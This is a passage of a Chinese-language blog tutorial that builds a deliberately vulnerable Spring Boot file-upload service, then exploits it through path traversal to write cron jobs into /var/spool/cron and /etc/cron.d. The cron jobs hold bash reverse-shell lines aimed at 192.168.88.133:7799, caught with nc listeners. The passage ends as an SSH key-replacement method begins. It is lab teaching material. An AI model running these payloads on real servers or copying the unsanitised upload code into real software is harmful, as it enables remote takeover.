class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">  &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;FileUploadHazards&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  &lt;name&gt;FileUploadHazards Maven Webapp&lt;/name&gt;</span><br><span class="line">  &lt;!-- FIXME change it to the project<span class="string">&#x27;s website --&gt;</span></span><br><span class="line"><span class="string">  &lt;url&gt;http://www.example.com&lt;/url&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;properties&gt;</span></span><br><span class="line"><span class="string">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span></span><br><span class="line"><span class="string">    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;</span></span><br><span class="line"><span class="string">    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;</span></span><br><span class="line"><span class="string">  &lt;/properties&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;!-- 继承父包 --&gt;</span></span><br><span class="line"><span class="string">  &lt;parent&gt;</span></span><br><span class="line"><span class="string">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">    &lt;version&gt;2.0.7.RELEASE&lt;/version&gt;</span></span><br><span class="line"><span class="string">  &lt;/parent&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;dependencies&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- web启动jar --&gt;</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;1.18.6&lt;/version&gt;</span></span><br><span class="line"><span class="string">      &lt;scope&gt;provided&lt;/scope&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;junit&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;4.11&lt;/version&gt;</span></span><br><span class="line"><span class="string">      &lt;scope&gt;test&lt;/scope&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">  &lt;/dependencies&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;build&gt;</span></span><br><span class="line"><span class="string">    &lt;finalName&gt;FileUploadHazards&lt;/finalName&gt;</span></span><br><span class="line"><span class="string">    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line"><span class="string">      &lt;plugins&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.1.0&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.0.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.8.0&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;2.22.1&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;3.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;2.5.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;plugin&gt;</span></span><br><span class="line"><span class="string">          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">          &lt;version&gt;2.8.2&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">      &lt;/plugins&gt;</span></span><br><span class="line"><span class="string">    &lt;/pluginManagement&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;resources&gt;</span></span><br><span class="line"><span class="string">      &lt;resource&gt;</span></span><br><span class="line"><span class="string">        &lt;directory&gt;src/main/resources&lt;/directory&gt;</span></span><br><span class="line"><span class="string">        &lt;includes&gt;</span></span><br><span class="line"><span class="string">          &lt;include&gt;**/*.*&lt;/include&gt;</span></span><br><span class="line"><span class="string">        &lt;/includes&gt;</span></span><br><span class="line"><span class="string">        &lt;filtering&gt;true&lt;/filtering&gt;</span></span><br><span class="line"><span class="string">      &lt;/resource&gt;</span></span><br><span class="line"><span class="string">    &lt;/resources&gt;</span></span><br><span class="line"><span class="string">  &lt;/build&gt;</span></span><br><span class="line"><span class="string">&lt;/project&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<p>创建一个文件，命名为application.yml，放在resources(原本没有，需要创建)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 8091</span><br></pre></td></tr></table></figure>
+<p>创建一个包，然后在里面创建一个Controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2023/6/2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:28</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadHandler</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">upload</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;index...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="mneJQZ2ipF-gG62PrXKr81ofOpE505V_5LxwpngyMpk.png" alt="image"></p>
+<p>创建一个启动类Application进行测试，注意启动类是放在controller的上一层</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2023/6/2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:31</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="Exco-E0VA0wqPqXgMVvYFh12-2UY4yrQ9kagV1HX8xk.png" alt="image"></p>
+<p>访问测试，成功打印了index… ；说明我们的项目没有问题了</p>
+<p><img src="iDHLMQQEZgtWRQ-pW3bQgUvigAYEIlS35YhTK63V5r0.png" alt="image"></p>
+<h3 id="文件上传的demo"><a href="#文件上传的demo" class="headerlink" title="文件上传的demo"></a>文件上传的demo</h3><p>这里写一个REST 风格的控制器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2023/6/2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:56</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;文件为空!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取项目资源路径</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">resourcePath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义存储文件的目录路径和文件全名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">folderPath</span> <span class="operator">=</span> resourcePath + File.separator + <span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;upload&quot;</span> + File.separator;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            System.out.println(<span class="string">&quot;folderPath1：&quot;</span>+folderPath);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若文件夹不存在，则创建文件夹</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">folderDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(folderPath);</span><br><span class="line">            <span class="keyword">if</span> (!folderDir.exists()) &#123;</span><br><span class="line">                <span class="comment">//使用mkdirs可以创建多级目录，mkdir只能创建一级目录</span></span><br><span class="line">                folderDir.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将上传的文件写入磁盘</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(folderPath + fileName);</span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;文件上传成功!\n&quot;</span>+ <span class="string">&quot;路径：&quot;</span>+ path;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;文件上传失败!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前端的upload.html放在webapp目录中</p>
+<p>upload.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;/upload&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;选择文件:&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;Upload&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>访问ip:port&#x2F;upload.html；进行文件上传</p>
+<p><img src="wPg3ggGvrpfNYLYDCyN1nc4dQz42CznP0j1ZQVixRxY.png" alt="image"></p>
+<p>上传成功</p>
+<p><img src="WGAt0yGrhfdXbrH6oAAoQsLr0thekpiAFk7OygfLqy0.png" alt="image"></p>
+<h3 id="打包为jar部署到Linux"><a href="#打包为jar部署到Linux" class="headerlink" title="打包为jar部署到Linux"></a>打包为jar部署到Linux</h3><p>修改一下pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"><span class="comment">&lt;!-- 修改一： --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修改二：   --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 保留jar插件 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>打包</p>
+<p><img src="VXATVhlY5wJYk0oify4c9vRQONdzyplim76_ffj9iC4.png" alt="image"></p>
+<p>把FileUploadHazards.jar上传到Linux的&#x2F;tmp进行启动。</p>
+<p><img src="iPsmnagjEdqeXm3IfZCu0ZQ4pyF8Ans1hptIYUaBt4k.png" alt="image"></p>
+<p>由于我们这里没有tomcat了，所以没办法访问upload.html来进行文件上传。但我们可以通过burp发包访问接口来上传。</p>
+<p><img src="w-T-uEWIvr7VE0c8qV5Sclx78sDAFm8MCIGrGbdyB2M.png" alt="image"></p>
+<p>查看服务器成功看到了我们上传的123.jpg</p>
+<p><img src="9Vjk45DGx0fjcBLIPia2KhUQHqawRsCG0MM5TzveXEI.png" alt="image"></p>
+<h3 id="利用-x2F-指定文件存储目录"><a href="#利用-x2F-指定文件存储目录" class="headerlink" title="利用..&#x2F;指定文件存储目录"></a>利用..&#x2F;指定文件存储目录</h3><p>尝试通过..&#x2F;来把我们上传的文件放到上一层目录，也就是我们的&#x2F;tmp&#x2F;data目录下。下图可见成功控制存储到了上一层目录</p>
+<p><img src="voFm36i6iPJqyHd-aNc-bPj0mmMrv4Q7zeg6P7CeN3o.png" alt="image"></p>
+<h2 id="利用姿势一-定时任务"><a href="#利用姿势一-定时任务" class="headerlink" title="利用姿势一(定时任务)"></a>利用姿势一(定时任务)</h2><p>由于crond 守护进程在后台静默地检查 &#x2F;etc&#x2F;crontab 文件和&#x2F;var&#x2F;spool&#x2F;cron 及 &#x2F;etc&#x2F;cron.d&#x2F;目录。</p>
+<p>定时任务的路径有</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/spool/cron/root   #文件要以用户名称存在</span><br><span class="line">/etc/cron.d            #这里的文件（任意名称和后缀），也会被轮询加载执行</span><br><span class="line">/etc/cron.daily/       #下面的任务都是每天<span class="number">6</span>：<span class="number">25</span> 执行</span><br><span class="line">/etc/cron.weekly/      #下面的任务都是每周日 <span class="number">6</span>：<span class="number">47</span> 执行</span><br><span class="line">/etc/cron.monthly/     #下面的任务都是每月<span class="number">1</span>号 <span class="number">6</span>：<span class="number">52</span> 执行</span><br></pre></td></tr></table></figure>
+<p>用法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>    <span class="number">12</span>   *   *   *   echo rce &gt;&gt; /tmp/hello</span><br><span class="line">#分  时   日   月  周  |《==============命令行=======================》|</span><br></pre></td></tr></table></figure>
+<p>查看crond的运行状态</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond status</span><br></pre></td></tr></table></figure>
+<p><img src="lPBuRzds7-sLeJ86IlkSlaKHu2k9rmgB9Q5CCafFoqE.png" alt="image"></p>
+<h3 id="利用路径一"><a href="#利用路径一" class="headerlink" title="利用路径一"></a>利用路径一</h3><p>条件：</p>
+<ul>
+<li>目标服务器的cron正常运行</li>
+<li>上传路径可以控制</li>
+<li>可以上传任意后缀文件，因为这里需要上传root命名的文件</li>
+</ul>
+<p>上传到：&#x2F;var&#x2F;spool&#x2F;cron&#x2F; （需要有读写的权限）</p>
+<p>nc监听</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">7799</span>  #直接监听</span><br><span class="line">nc -lvnp <span class="number">7799</span> -s <span class="number">192.168</span><span class="number">.88</span><span class="number">.133</span> #指定IP监听</span><br></pre></td></tr></table></figure>
+<p> 上传文件到  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p>
+<p> 上传文件到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span>  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/<span class="number">192.168</span><span class="number">.88</span><span class="number">.133</span>/<span class="number">7799</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上传的文件名需为用户名称，如：root、test等用户</p>
+<p><img src="2NFurrmX1tT7Guq9hNa0Z9-SU5VDlKI6OERFtbisSeU.png" alt="image"></p>
+<p>这里踩了个坑，因为我攻击机是win，然后目标是Linux，换行会涉及到一些编码的问题，直到我在notepad++上转为Unix之后才能成功。</p>
+<p><img src="x67OuJ4x5fgfB7K54tK15ZuJaCdo2rPDkD0J60-MPI8.png" alt="image"></p>
+<p>成功反弹shell</p>
+<p><img src="0imi-hY6u5bns_al8-Dpqg1a0gTEfcWlxOSj8_a3HCQ.png" alt="image"></p>
+<h3 id="利用路径二"><a href="#利用路径二" class="headerlink" title="利用路径二"></a>利用路径二</h3><p>条件</p>
+<ul>
+<li><p>目标服务器的crond正常运行</p>
+</li>
+<li><p>上传路径可以控制</p>
+</li>
+<li><p>对&#x2F;etc&#x2F;cron.d目录有写入权限即可，后缀名不限</p>
+</li>
+</ul>
+<p>因为在&#x2F;etc&#x2F;cron.d这个目录下，任意后缀的文件都可以执行，我们创建一个每分钟执行一次的定时任务；并且把结果输出到&#x2F;tmp下的haha文件中（注意这里要添加一个用户名）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span>  *  *  *  *   root /bin/bash -i&gt;&amp;/dev/tcp/<span class="number">192.168</span><span class="number">.88</span><span class="number">.133</span>/<span class="number">7799</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>首先我们确认&#x2F;var&#x2F;spool&#x2F;cron下是没有任何文件的</p>
+<p><img src="2A3ex48KgqF9Ql6WN6Iv6L141g7dL_y52uhe8qu1Wzk.png" alt="image"></p>
+<p>burp上传</p>
+<p><img src="N1O8-V_1aCtxhLa9G0zhlopo-lQGW2WQVlZm47AqEYw.png" alt="image"></p>
+<p>nc进行监听</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">7799</span>  #直接监听</span><br></pre></td></tr></table></figure>
+<p>成功反弹shell</p>
+<p><img src="bSH3OXbHwr4w4dHdzIFEgegftTMo_mA_IAbLHnuEF7k.png" alt="image"></p>
+<h2 id="利用姿势二（替换公钥）"><a href="#利用姿势二（替换公钥）" class="headerlink" title="利用姿势二（替换公钥）"></a>利用姿势二（替换公钥）</h2><p>利用条件：</p>
+<ul>
+<li><p>上传路径可以控制</p>
+</li>
+<li><p>对文件名无限制</p>
+</li>
+<li><p>目标开启ssh端口</p>
+</li>
+<li><p>支持密钥登录</p>
